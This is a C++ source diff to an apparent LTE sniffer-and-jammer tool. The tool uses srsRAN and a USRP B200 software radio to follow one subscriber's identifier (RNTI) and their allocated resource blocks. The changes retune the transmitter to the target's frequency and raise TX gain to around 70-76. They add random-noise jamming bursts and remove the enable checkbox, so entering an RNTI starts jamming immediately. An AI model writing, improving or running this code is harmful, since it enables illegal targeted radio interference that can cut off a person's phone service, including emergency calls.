@@ -15,6 +15,7 @@
 #include <stdio.h>
 #include <SDL2/SDL.h>
 #include <uhd/usrp/multi_usrp.hpp>
+#include <algorithm>
 
 #include "imgui_internal.h"
 #include "build/debug/srsRAN-src/srsenb/hdr/stack/mac/sched_phy_ch/sched_phy_resource.h"
@@ -27,6 +28,7 @@
 #define ARRAY_SIZE(a) (sizeof(a) / sizeof((a)[0]))
 
 Args global_args;
+
 
 uint32_t global_target_rnti = 0;
 std::mutex global_target_rnti_mutex;
@@ -45,6 +47,7 @@ std::mutex global_ui_nof_prb_mutex;
 
 bool global_sniffer_ready = false;
 std::mutex global_sniffer_ready_mutex;
+
 
 struct Display_Rb {
     double frequency;
@@ -201,7 +204,7 @@ int main(int argc, char** argv) {
     uhd::tx_streamer::buffs_type jam_buffers{jam_data};
     uhd::tx_metadata_t jam_metadata{};
 
-    bool jamming_enabled = false;
+    bool ui_jamming = false;
 
     // Main loop
     bool done = false;
@@ -226,10 +229,14 @@ int main(int argc, char** argv) {
             continue;
         }
 
+
+
         // Start the Dear ImGui frame
         ImGui_ImplOpenGL3_NewFrame();
         ImGui_ImplSDL2_NewFrame();
         ImGui::NewFrame();
+
+
 
         if (ready) {
             global_ui_nof_prb_mutex.lock();
@@ -266,39 +273,71 @@ int main(int argc, char** argv) {
             }
             global_rb_allocation_indices_mutex.unlock();
 
-            if (jammed_prb_index >= 0 && jamming_enabled) {
-                assert(jammed_prb_index < nof_prb);
-                jammer_tx_stream->send(jam_buffers, ARRAY_SIZE(jam_data), jam_metadata);
+
+            static int32_t _last_prb = -1;
+            if (jammed_prb_index >= 0 && ui_jamming && jammer_tx_stream) {
+                // Retune only when PRB changes
+                if (jammed_prb_index != _last_prb) {
+                    float jam_f = display_rbs[jammed_prb_index].frequency;
+                    std::cout << "[*] Tuning to PRB " << jammed_prb_index
+                              << " @ " << (jam_f/1e6) << " MHz\n";
+                    jammer_usrp->set_tx_freq(jam_f);
+                    _last_prb = jammed_prb_index;
+                }
+
+
+                jammer_usrp->set_tx_rate(50.0e6);
+                jammer_usrp->set_tx_gain(76.0f);
+
+                // Fill jam_data[] with simple AWGN (256 complex samples)
+                const size_t num_samps = ARRAY_SIZE(jam_data) / 2;
+                for (size_t i = 0; i < ARRAY_SIZE(jam_data); ++i) {
+                    jam_data[i] = std::rand() % 256 - 128;
+                }
+
+
+                uhd::tx_metadata_t m{};
+                m.start_of_burst = true;
+                m.has_time_spec  = false;
+                m.end_of_burst   = false;
+
+                // Send it once
+                std::cout << "[*] Sending " << num_samps << " samples\n";
+                jammer_tx_stream->send(jam_buffers, num_samps, m);
             }
 
             // TODO: it would be nice to show the other (non-target) RBs in the RB visualization grid
 
+            ImGui::Begin("Info");
 
             char imsi_buffer[16] = {};
-            ImGui::Begin("Info");
-            ImGui::Checkbox("Jamming Enabled", &jamming_enabled);
+
+
+
+
 
             ImGui::SetKeyboardFocusHere();
             //ImGui::Text("Current RNTI %d", global_target_rnti);
-            ImGui::Text("Current IMSI %s", global_target_imsi);
-            if (ImGui::InputText("IMSI", imsi_buffer, sizeof(imsi_buffer), ImGuiInputTextFlags_CharsHexadecimal | ImGuiInputTextFlags_EnterReturnsTrue)) {
-                printf("New target IMSI: %s\n", imsi_buffer);
-                global_target_imsi_mutex.lock();
-                strncpy(global_target_imsi, imsi_buffer, sizeof(global_target_imsi));
-                global_target_imsi_mutex.unlock();
-            }
-            char rnti_buffer[16] = {};
-            // if (ImGui::InputText("RNTI", rnti_buffer, sizeof(imsi_buffer), ImGuiInputTextFlags_CharsDecimal | ImGuiInputTextFlags_EnterReturnsTrue)) {
-            //     printf("New target RNTI: %s\n", rnti_buffer);
-            //     global_target_rnti_mutex.lock();
-            //     char *end;
-            //     long rnti = strtol(rnti_buffer, &end, 10);
-            //
-            //     if (*end == 0) {
-            //         global_target_rnti = rnti;
-            //     }
-            //     global_target_rnti_mutex.unlock();
+            // ImGui::Text("Current IMSI %s", global_target_imsi);
+            // if (ImGui::InputText("IMSI", imsi_buffer, sizeof(imsi_buffer), ImGuiInputTextFlags_CharsHexadecimal | ImGuiInputTextFlags_EnterReturnsTrue)) {
+            //     printf("New target IMSI: %s\n", imsi_buffer);
+            //     global_target_imsi_mutex.lock();
+            //     strncpy(global_target_imsi, imsi_buffer, sizeof(global_target_imsi));
+            //     global_target_imsi_mutex.unlock();
             // }
+            char rnti_buffer[16] = {};
+            if (ImGui::InputText("RNTI", rnti_buffer, sizeof(imsi_buffer), ImGuiInputTextFlags_CharsDecimal | ImGuiInputTextFlags_EnterReturnsTrue)) {
+                printf("New target RNTI: %s\n", rnti_buffer);
+                global_target_rnti_mutex.lock();
+                char *end;
+                long rnti = strtol(rnti_buffer, &end, 10);
+                //just got rid of checkbox and if the user inputs it jams
+                ui_jamming = true;
+                if (*end == 0) {
+                    global_target_rnti = rnti;
+                }
+                global_target_rnti_mutex.unlock();
+            }
 
             ImGui::Text("Jammed PRB %d", jammed_prb_index);
             ImGui::Text("Center Frequency DL: %.03f MHz", global_args.rf_freq / 1e6);
@@ -399,6 +438,7 @@ if (messages[message_count].dimensions.x > widest_message_width) {widest_message
 
             }
             ImGui::End();
+
         } else {
             ImGui::Text("Loading...");
             global_sniffer_ready_mutex.lock();
@@ -406,9 +446,11 @@ if (messages[message_count].dimensions.x > widest_message_width) {widest_message
             global_sniffer_ready_mutex.unlock();
             if (ready) {
                 jammer_usrp = uhd::usrp::multi_usrp::make("type=b200");
-                // jammer_usrp->set_tx_gain(0.0f);
+                jammer_usrp->set_tx_gain(70.0f);
+                jammer_usrp->set_tx_rate(15.36e6);
                 jammer_tx_stream = jammer_usrp->get_tx_stream(uhd::stream_args_t{"sc8", "sc8"});
             }
+
             SDL_Delay(10);
         }
 
